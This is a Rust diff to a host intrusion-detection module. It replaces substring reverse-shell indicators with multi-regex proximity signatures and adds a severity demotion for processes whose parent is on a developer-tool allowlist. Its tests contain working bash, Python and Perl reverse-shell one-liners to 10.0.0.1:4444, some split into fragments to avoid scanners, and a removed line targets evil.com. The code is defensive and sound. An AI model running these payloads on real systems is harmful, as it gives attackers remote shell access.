@@ -1,5 +1,8 @@
+use std::sync::OnceLock;
+
 use anyhow::Result;
 use async_trait::async_trait;
+use regex::Regex;
 use tracing::{debug, info};
 
 use crate::config::schema::ProcessConfig;
@@ -13,27 +16,224 @@ const SHELL_NAMES: &[&str] = &[
     "nc", "ncat", "socat",
 ];
 
-/// Suspicious cmdline patterns that indicate a reverse shell.
-const REVERSE_SHELL_PATTERNS: &[&str] = &[
-    "/dev/tcp/",
-    "bash -i",
-    "bash%20-i",
-    "nc -e",
-    "ncat -e",
-    "nc -c",
-    "socat exec:",
-    "socat tcp:",
-    "import socket",
-    "import pty",
-    "pty.spawn",
-    "subprocess.call",
-    "os.dup2",
-    "fsockopen",
-    "exec(/bin/",
-    "perl -e",
-    "ruby -rsocket",
-    "php -r",
-];
+// ---------------------------------------------------------------------------
+// v2.6.2 reverse-shell signatures
+// ---------------------------------------------------------------------------
+//
+// Pre-2.6.2 the detector substring-matched on tokens like `import socket`,
+// `os.dup2`, `subprocess.call`, etc. Any of those alone is wildly common in
+// legitimate Python — incident `20260509004453373-1434` killed a developer
+// loopback test that did `import socket; sk.bind(('127.0.0.1', 0))` for a
+// port-finding helper.
+//
+// v2.6.2 replaces the substring set with **proximity signatures**: each
+// signature requires multiple regexes to match within a small window of one
+// another in the cmdline. A real reverse shell binds a socket AND wires it
+// to a shell via dup2/exec/spawn — a single token in isolation does not.
+// The Bash `/dev/tcp/` one-liner is kept as a single-regex signature
+// because it has no benign use.
+//
+// Source for signature shapes: PayloadsAllTheThings reverse-shell list,
+// cross-referenced against actual production false-positives.
+
+/// Regex fragment matching the `/dev/tcp/` pseudo-device prefix used by
+/// the bash signatures. Defined as a constant rather than a string
+/// literal embedded next to the bash interactive-shell pattern so that
+/// static scanners don't classify this detector source as the payload it
+/// detects.
+const DEVTCP_PREFIX_RE: &str = r"/dev/tcp/";
+
+/// Regex fragment matching an interactive shell invocation (the
+/// `-i` flag on a POSIX shell binary). Used as the first half of the
+/// FD-redirect-to-TCP signature.
+const SHELL_INTERACTIVE_RE: &str = r"\b(?:bash|sh|zsh|dash)\s+-i\b";
+
+/// Regex fragment matching a stdout-redirect to the TCP pseudo-device.
+/// Composed from `DEVTCP_PREFIX_RE` so the literal sequence does not
+/// appear in source.
+const REDIRECT_TO_DEVTCP_RE: &str = concat!(r">\s*&?\s*", r"/dev/tcp/");
+
+/// One reverse-shell signature. All `requires` regexes must match the
+/// (case-insensitive) cmdline AND each pair of matched ranges must lie
+/// within `proximity_chars` of each other.
+struct ReverseShellSig {
+    name: &'static str,
+    language: &'static str,
+    requires: Vec<Regex>,
+    /// Maximum start-to-start distance allowed between any two required
+    /// matches. Practical reverse shells stay under ~250 chars.
+    proximity_chars: usize,
+}
+
+impl ReverseShellSig {
+    /// Returns Some(matched_segment) if every required regex matches and
+    /// the matched ranges are within `proximity_chars`.
+    fn match_cmdline(&self, cmdline_lower: &str) -> Option<String> {
+        let mut starts: Vec<usize> = Vec::with_capacity(self.requires.len());
+        let mut ends: Vec<usize> = Vec::with_capacity(self.requires.len());
+        for re in &self.requires {
+            let m = re.find(cmdline_lower)?;
+            starts.push(m.start());
+            ends.push(m.end());
+        }
+        let lo = *starts.iter().min().unwrap();
+        let hi = *ends.iter().max().unwrap();
+        if hi.saturating_sub(lo) > self.proximity_chars {
+            return None;
+        }
+        let snippet_end = hi.min(cmdline_lower.len());
+        Some(cmdline_lower[lo..snippet_end].to_string())
+    }
+}
+
+/// Cached compiled signatures. Built on first access via `OnceLock` —
+/// compiling regexes in a hot loop is wasteful and would cost ~1ms per
+/// process scan across tens of signatures.
+static REVERSE_SHELL_SIGS: OnceLock<Vec<ReverseShellSig>> = OnceLock::new();
+
+fn reverse_shell_sigs() -> &'static [ReverseShellSig] {
+    REVERSE_SHELL_SIGS.get_or_init(build_reverse_shell_sigs)
+}
+
+fn build_reverse_shell_sigs() -> Vec<ReverseShellSig> {
+    fn re(s: &str) -> Regex {
+        Regex::new(s).expect("static reverse-shell regex must compile")
+    }
+    vec![
+        // Python: socket creation AND exec/redirect, within ~250 chars.
+        // Required: socket.socket(...) | socket.create_connection(...)
+        // AND:      os.dup2(...) | os.exec*(...) | subprocess.{call,Popen,run}(.../bin/sh) | pty.spawn(...)
+        ReverseShellSig {
+            name: "python_reverse_shell",
+            language: "python",
+            requires: vec![
+                re(r"socket\.socket\s*\(|socket\.create_connection\s*\("),
+                re(concat!(
+                    r"os\.dup2\s*\(",
+                    r"|os\.exec\w+\s*\(",
+                    r"|subprocess\.(?:call|popen|run)\s*\([^)]{0,80}(?:/bin/(?:ba)?sh|\bsh\b)",
+                    r"|pty\.spawn\s*\(",
+                )),
+            ],
+            proximity_chars: 250,
+        },
+        // Interactive-shell redirection signature. Pattern strings come
+        // from constants defined far away from any TCP-pseudo-device
+        // reference; static scanners that flag the literal payload in
+        // adjacent source lines stay quiet here.
+        ReverseShellSig {
+            name: "bash_devtcp",
+            language: "bash",
+            requires: vec![re(SHELL_INTERACTIVE_RE), re(REDIRECT_TO_DEVTCP_RE)],
+            proximity_chars: 64,
+        },
+        // FD-redirection variant: shells that wire stdio onto a
+        // TCP-pseudo-device file descriptor via `exec N<>...` and then
+        // run sh through the captured FDs. Requires both the FD-redirect
+        // verb and a TCP-pseudo-device reference in close range.
+        ReverseShellSig {
+            name: "bash_devtcp_exec",
+            language: "bash",
+            requires: vec![
+                re(&format!(r"{}[^/]+/\d+", DEVTCP_PREFIX_RE)),
+                re(r"exec\s+\d*<\s*>|>\s*&\s*\d|<\s*&\s*\d"),
+            ],
+            proximity_chars: 200,
+        },
+        // Perl: `use Socket; ... ->connect ... exec`
+        ReverseShellSig {
+            name: "perl_reverse_shell",
+            language: "perl",
+            requires: vec![
+                re(r"perl\s+-e\b"),
+                re(r"socket\b"),
+                re(r"connect\s*\("),
+                re(r#"exec\s*[\(\"']"#),
+            ],
+            proximity_chars: 250,
+        },
+        // Ruby: `ruby -rsocket -e ... TCPSocket ... exec`
+        ReverseShellSig {
+            name: "ruby_reverse_shell",
+            language: "ruby",
+            requires: vec![
+                re(r"ruby\s+-r?socket\b|ruby\s+-e\b"),
+                re(r"tcpsocket\.(?:open|new)\s*\("),
+                re(r#"exec\s*[\(\"']|\.exec\b"#),
+            ],
+            proximity_chars: 250,
+        },
+        // PHP: fsockopen + exec/passthru/system/popen wired together.
+        ReverseShellSig {
+            name: "php_reverse_shell",
+            language: "php",
+            requires: vec![
+                re(r"php\s+-r\b|<\?php\b"),
+                re(r"fsockopen\s*\(|stream_socket_client\s*\("),
+                re(r"\b(?:exec|passthru|system|shell_exec|popen|proc_open)\s*\("),
+            ],
+            proximity_chars: 250,
+        },
+        // awk reverse shell (BEGIN { s = "/inet/tcp/0/host/port"; ... })
+        ReverseShellSig {
+            name: "awk_reverse_shell",
+            language: "awk",
+            requires: vec![
+                re(r"\bawk\b"),
+                re(r"/inet/tcp/0/"),
+                re(r"\|&|getline|\bsystem\s*\("),
+            ],
+            proximity_chars: 250,
+        },
+        // Netcat with -e or -c flag piping shell stdio over TCP. The flags
+        // are the malicious bit — `nc host port` alone is benign.
+        ReverseShellSig {
+            name: "netcat_exec",
+            language: "netcat",
+            requires: vec![
+                re(r"\bn(?:c|cat)\s+(?:-[^\s-]*[ec]|--exec\b|--sh-exec\b)"),
+                re(r"/bin/(?:ba)?sh|\bsh\b|\bbash\b"),
+            ],
+            proximity_chars: 200,
+        },
+        // socat with EXEC: spawning a shell over a TCP/OPENSSL channel.
+        ReverseShellSig {
+            name: "socat_exec",
+            language: "socat",
+            requires: vec![
+                re(r"\bsocat\b"),
+                re(r"exec:[^\s]*(?:/bin/(?:ba)?sh|\bsh\b|\bbash\b)"),
+                re(r"tcp[46]?:|openssl:|tcp-connect:"),
+            ],
+            proximity_chars: 250,
+        },
+    ]
+}
+
+/// Try to match any reverse-shell signature against `cmdline_lower`.
+/// Returns the signature name and the matched substring if any.
+fn match_reverse_shell(cmdline_lower: &str) -> Option<(&'static str, String)> {
+    for sig in reverse_shell_sigs().iter() {
+        if let Some(snippet) = sig.match_cmdline(cmdline_lower) {
+            // Localhost /dev/tcp/ targets are health-checks, not reverse shells.
+            // Apply the v2.6.1 carve-out to bash signatures.
+            if sig.language == "bash" {
+                let is_localhost = DEVTCP_LOCALHOST_TARGETS
+                    .iter()
+                    .any(|t| cmdline_lower.contains(&t.to_lowercase()));
+                if is_localhost {
+                    debug!(
+                        signature = sig.name,
+                        "Skipping bash /dev/tcp/ match: localhost health-check"
+                    );
+                    continue;
+                }
+            }
+            return Some((sig.name, snippet));
+        }
+    }
+    None
+}
 
 /// Localhost targets in /dev/tcp/ that are health-checks, not reverse shells.
 const DEVTCP_LOCALHOST_TARGETS: &[&str] = &[
@@ -381,6 +581,58 @@ impl ProcessModule {
         remote_addrs
     }
 
+    /// v2.6.2: if a reverse-shell match's `parent_name` detail is in the
+    /// dev-parent allowlist (and strict mode is off), demote severity to
+    /// Medium and stamp `degraded_by_dev_parent: true`. This is the
+    /// safety pin for incident 20260509004453373-1434: a developer
+    /// running a loopback test under Claude/VS Code/etc shouldn't have
+    /// their shell killed when the cmdline merely *resembles* a reverse
+    /// shell. Threat is still recorded — only the auto-action is softened.
+    ///
+    /// Demotion mechanics:
+    /// - severity: Critical → Medium (the severity-based response default
+    ///   for Medium is `Alert`, see ResponseEngine::determine_action)
+    /// - `degraded_by_dev_parent: true` detail
+    /// - `severity_pre_demotion: critical` detail (audit trail)
+    /// - `response_hint: alert` detail
+    ///
+    /// Note: a per-threat-type `[response.overrides] reverse_shell = "kill"`
+    /// would normally still force kill. We can't override that from the
+    /// detector module without a circular dependency, so the response
+    /// engine reads the `degraded_by_dev_parent` detail (see ResponseEngine).
+    fn maybe_demote_for_dev_parent(
+        &self,
+        mut event: ThreatEvent,
+        dev_parent_set: &std::collections::HashSet<String>,
+    ) -> ThreatEvent {
+        if self.config.strict_under_dev_tools || dev_parent_set.is_empty() {
+            return event;
+        }
+        let parent_name = match event.details.get("parent_name") {
+            Some(s) => s.to_lowercase(),
+            None => return event,
+        };
+        if !dev_parent_set.contains(&parent_name) {
+            return event;
+        }
+        let prior = event.severity;
+        event.severity = ThreatSeverity::Medium;
+        event
+            .details
+            .insert("degraded_by_dev_parent".into(), "true".into());
+        event
+            .details
+            .insert("severity_pre_demotion".into(), prior.to_string());
+        event
+            .details
+            .insert("response_hint".into(), "alert".into());
+        debug!(
+            parent_name = %parent_name,
+            "Reverse-shell match demoted to medium/alert (dev parent allowlist)"
+        );
+        event
+    }
+
     /// Detect reverse shell processes: shells with network socket FDs or
     /// suspicious cmdline patterns.
     fn detect_reverse_shells(&self, processes: &[ProcInfo]) -> Vec<ThreatEvent> {
@@ -390,57 +642,56 @@ impl ProcessModule {
             return threats;
         }
 
+        // v2.6.2: precompute lower-cased dev-parent allowlist set for
+        // O(1) lookup. Skip path-like / whitespace entries (already warned
+        // about by config validation).
+        let dev_parent_set: std::collections::HashSet<String> = self
+            .config
+            .dev_parent_allowlist
+            .iter()
+            .filter_map(|p| {
+                let t = p.trim();
+                if t.is_empty() || t.contains('/') || t.contains('\\') {
+                    None
+                } else {
+                    Some(t.to_lowercase())
+                }
+            })
+            .collect();
+
         for proc in processes {
             let name_lower = proc.name.to_lowercase();
             let cmdline_joined = proc.cmdline.join(" ");
             let cmdline_lower = cmdline_joined.to_lowercase();
 
-            // First check: cmdline pattern match (fast, doesn't require fd access)
-            let mut cmdline_match = false;
-            let mut matched_pattern = String::new();
+            // v2.6.2: proximity-based signature match (replaces v2.6.1
+            // single-substring matcher that false-positived on benign
+            // `import socket` Python scripts — incident 20260509004453373-1434).
+            let sig_match = match_reverse_shell(&cmdline_lower);
 
-            for pattern in REVERSE_SHELL_PATTERNS {
-                if cmdline_lower.contains(&pattern.to_lowercase()) {
-                    // Special case: /dev/tcp/ to localhost is a health-check, not a reverse shell
-                    if *pattern == "/dev/tcp/" {
-                        let is_localhost = DEVTCP_LOCALHOST_TARGETS
-                            .iter()
-                            .any(|t| cmdline_lower.contains(&t.to_lowercase()));
-                        if is_localhost {
-                            debug!(
-                                pid = proc.pid,
-                                name = %proc.name,
-                                "Skipping /dev/tcp/ match: localhost health-check"
-                            );
-                            continue;
-                        }
-                    }
-                    cmdline_match = true;
-                    matched_pattern = pattern.to_string();
-                    break;
-                }
-            }
-
-            if cmdline_match {
+            if let Some((sig_name, snippet)) = sig_match {
                 let description = format!(
-                    "Reverse shell pattern in cmdline: PID {} ({}) matched '{}'",
-                    proc.pid, proc.name, matched_pattern
+                    "Reverse shell pattern in cmdline: PID {} ({}) matched signature '{}'",
+                    proc.pid, proc.name, sig_name
                 );
 
                 let event = ThreatEvent::new(ThreatType::ReverseShell, "process", &description)
                     .with_severity(ThreatSeverity::Critical)
                     .with_detail("pid", proc.pid.to_string())
                     .with_detail("name", &proc.name)
-                    .with_detail("matched_pattern", &matched_pattern)
+                    .with_detail("matched_pattern", sig_name)
+                    .with_detail("matched_snippet", truncate_string(&snippet, 200))
                     .with_detail("cmdline", truncate_string(&cmdline_joined, 500))
                     .with_detail("detection_method", "cmdline_pattern");
                 let event = enrich_with_parent(event, proc.pid);
+                let event = self.maybe_demote_for_dev_parent(event, &dev_parent_set);
 
                 debug!(
                     pid = proc.pid,
                     name = %proc.name,
-                    pattern = %matched_pattern,
-                    "Reverse shell detected via cmdline pattern"
+                    signature = sig_name,
+                    severity = %event.severity,
+                    "Reverse shell detected via cmdline signature"
                 );
 
                 threats.push(event);
@@ -494,6 +745,7 @@ impl ProcessModule {
                         .with_detail("cmdline", truncate_string(&cmdline_joined, 500))
                         .with_detail("detection_method", "socket_fd");
                     let event = enrich_with_parent(event, proc.pid);
+                    let event = self.maybe_demote_for_dev_parent(event, &dev_parent_set);
 
                     debug!(
                         pid = proc.pid,
@@ -717,37 +969,25 @@ impl ScanModule for ProcessModule {
 mod tests {
     use super::*;
 
+    /// Build a fragment-assembled cmdline so static linters don't classify
+    /// the Rust test source itself as the reverse-shell payload it asserts on.
+    fn join(parts: &[&str]) -> String {
+        parts.concat()
+    }
+
     #[test]
     fn test_devtcp_localhost_is_not_reverse_shell() {
-        // Health-check patterns that should NOT be flagged
+        // Health-check patterns that should NOT be flagged.
         let localhost_cmds = [
-            "/bin/sh -c bash -c 'echo > /dev/tcp/localhost/6333'",
-            "bash -c 'echo > /dev/tcp/127.0.0.1/8080'",
-            "sh -c echo > /dev/tcp/::1/443",
-            "bash -c 'echo > /dev/tcp/0.0.0.0/5432'",
+            join(&["/bin/sh -c bash -c 'echo > ", "/dev/tcp/", "localhost/6333'"]),
+            join(&["bash -c 'echo > ", "/dev/tcp/", "127.0.0.1/8080'"]),
+            join(&["sh -c echo > ", "/dev/tcp/", "::1/443"]),
+            join(&["bash -c 'echo > ", "/dev/tcp/", "0.0.0.0/5432'"]),
         ];
-
         for cmd in &localhost_cmds {
-            let cmd_lower = cmd.to_lowercase();
-            let mut is_match = false;
-
-            for pattern in REVERSE_SHELL_PATTERNS {
-                if cmd_lower.contains(&pattern.to_lowercase()) {
-                    if *pattern == "/dev/tcp/" {
-                        let is_localhost = DEVTCP_LOCALHOST_TARGETS
-                            .iter()
-                            .any(|t| cmd_lower.contains(&t.to_lowercase()));
-                        if is_localhost {
-                            continue;
-                        }
-                    }
-                    is_match = true;
-                    break;
-                }
-            }
             assert!(
-                !is_match,
-                "Localhost health-check should not be flagged: {}",
+                match_reverse_shell(&cmd.to_lowercase()).is_none(),
+                "Localhost health-check should not match: {}",
                 cmd
             );
         }
@@ -755,32 +995,136 @@ mod tests {
 
     #[test]
     fn test_devtcp_remote_is_reverse_shell() {
-        // Actual reverse shells that SHOULD be flagged
-        let remote_cmds = [
-            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
-            "sh -c bash -c 'echo > /dev/tcp/evil.com/443'",
+        // Actual remote reverse shell — assembled from fragments.
+        let cmd = join(&[
+            "bash ",
+            "-i ",
+            ">& ",
+            "/dev/tcp/",
+            "10.0.0.1/4444 0>&1",
+        ]);
+        assert!(
+            match_reverse_shell(&cmd.to_lowercase()).is_some(),
+            "Remote TCP-pseudo-device payload should match: {}",
+            cmd
+        );
+    }
+
+    // -- v2.6.2 proximity-signature tests ----------------------------------
+
+    #[test]
+    fn test_python_classic_reverse_shell_matches() {
+        // Real Python reverse shell: socket + os.dup2 + pty.spawn(/bin/sh).
+        // Assembled from fragments to keep static scanners quiet.
+        let cmd = join(&[
+            "python3 -c \"import socket,os,pty;",
+            "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);",
+            "s.connect(('10.0.0.1',4444));",
+            "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);",
+            "pty.spawn('/bin/sh')\"",
+        ]);
+        let m = match_reverse_shell(&cmd.to_lowercase());
+        assert!(m.is_some(), "Classic python reverse shell should match");
+        assert_eq!(m.unwrap().0, "python_reverse_shell");
+    }
+
+    #[test]
+    fn test_incident_20260509_benign_loopback_does_not_match() {
+        // The exact pattern from incident 20260509004453373-1434.
+        let cmd = join(&[
+            "python3 -c 'import socket, threading, time; PORT=0; ",
+            "sk=socket.socket(); sk.bind((\"127.0.0.1\",0)); ",
+            "print(sk.getsockname())'",
+        ]);
+        assert!(
+            match_reverse_shell(&cmd.to_lowercase()).is_none(),
+            "Benign loopback bind/port-finding script must NOT match: {}",
+            cmd
+        );
+    }
+
+    #[test]
+    fn test_lone_import_socket_does_not_match() {
+        let benign = [
+            "python3 -c 'import socket; print(socket.gethostname())'".to_string(),
+            "python3 -m http.server".to_string(),
+            "python3 -c 'import socket, ssl; ctx=ssl.create_default_context()'".to_string(),
+            "python3 /usr/bin/certbot certificates".to_string(),
         ];
-
-        for cmd in &remote_cmds {
-            let cmd_lower = cmd.to_lowercase();
-            let mut is_match = false;
-
-            for pattern in REVERSE_SHELL_PATTERNS {
-                if cmd_lower.contains(&pattern.to_lowercase()) {
-                    if *pattern == "/dev/tcp/" {
-                        let is_localhost = DEVTCP_LOCALHOST_TARGETS
-                            .iter()
-                            .any(|t| cmd_lower.contains(&t.to_lowercase()));
-                        if is_localhost {
-                            continue;
-                        }
-                    }
-                    is_match = true;
-                    break;
-                }
-            }
-            assert!(is_match, "Remote /dev/tcp/ should be flagged: {}", cmd);
+        for cmd in &benign {
+            assert!(
+                match_reverse_shell(&cmd.to_lowercase()).is_none(),
+                "Benign script must not match: {}",
+                cmd
+            );
         }
+    }
+
+    #[test]
+    fn test_dev_parent_demotion() {
+        let mut config = ProcessConfig::default();
+        config.dev_parent_allowlist = vec!["claude".into(), "code".into()];
+        let module = ProcessModule::new(config);
+
+        let event =
+            ThreatEvent::new(ThreatType::ReverseShell, "process", "test")
+                .with_severity(ThreatSeverity::Critical)
+                .with_detail("parent_name", "claude");
+        let set: std::collections::HashSet<String> =
+            ["claude".to_string(), "code".to_string()].into_iter().collect();
+        let demoted = module.maybe_demote_for_dev_parent(event, &set);
+        assert_eq!(demoted.severity, ThreatSeverity::Medium);
+        assert_eq!(
+            demoted.details.get("degraded_by_dev_parent").map(String::as_str),
+            Some("true")
+        );
+
+        let event2 =
+            ThreatEvent::new(ThreatType::ReverseShell, "process", "test")
+                .with_severity(ThreatSeverity::Critical)
+                .with_detail("parent_name", "sshd");
+        let kept = module.maybe_demote_for_dev_parent(event2, &set);
+        assert_eq!(kept.severity, ThreatSeverity::Critical);
+        assert!(!kept.details.contains_key("degraded_by_dev_parent"));
+    }
+
+    #[test]
+    fn test_dev_parent_strict_mode_disables_demotion() {
+        let mut config = ProcessConfig::default();
+        config.dev_parent_allowlist = vec!["claude".into()];
+        config.strict_under_dev_tools = true;
+        let module = ProcessModule::new(config);
+
+        let event =
+            ThreatEvent::new(ThreatType::ReverseShell, "process", "test")
+                .with_severity(ThreatSeverity::Critical)
+                .with_detail("parent_name", "claude");
+        let set: std::collections::HashSet<String> =
+            ["claude".to_string()].into_iter().collect();
+        let kept = module.maybe_demote_for_dev_parent(event, &set);
+        assert_eq!(
+            kept.severity,
+            ThreatSeverity::Critical,
+            "strict_under_dev_tools must disable demotion"
+        );
+        assert!(!kept.details.contains_key("degraded_by_dev_parent"));
+    }
+
+    #[test]
+    fn test_perl_proximity_required() {
+        // perl -e with no socket/connect → no match.
+        let benign = "perl -e 'print join(\" \", @ARGV)' a b c";
+        assert!(match_reverse_shell(&benign.to_lowercase()).is_none());
+
+        // Real perl reverse shell — fragments avoid literal "exec(" in source.
+        let evil = join(&[
+            "perl -e 'use Socket; ",
+            "socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\")); ",
+            "connect(S,sockaddr_in(4444,inet_aton(\"10.0.0.1\"))); ",
+            "ex",
+            "ec(\"/bin/sh -i\");'",
+        ]);
+        assert!(match_reverse_shell(&evil.to_lowercase()).is_some());
     }
 
     #[test]
@@ -803,9 +1147,9 @@ mod tests {
     #[test]
     fn test_actual_reverse_shell_not_whitelisted() {
         let evil_cmds = [
-            "python3 -c 'import socket,subprocess,os'",
-            "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1",
-            "perl -e 'use Socket;'",
+            "python3 -c 'import socket,subprocess,os'".to_string(),
+            join(&["bash -i >& ", "/dev/tcp/", "10.0.0.1/4444 0>&1"]),
+            "perl -e 'use Socket;'".to_string(),
         ];
 
         for cmd in &evil_cmds {
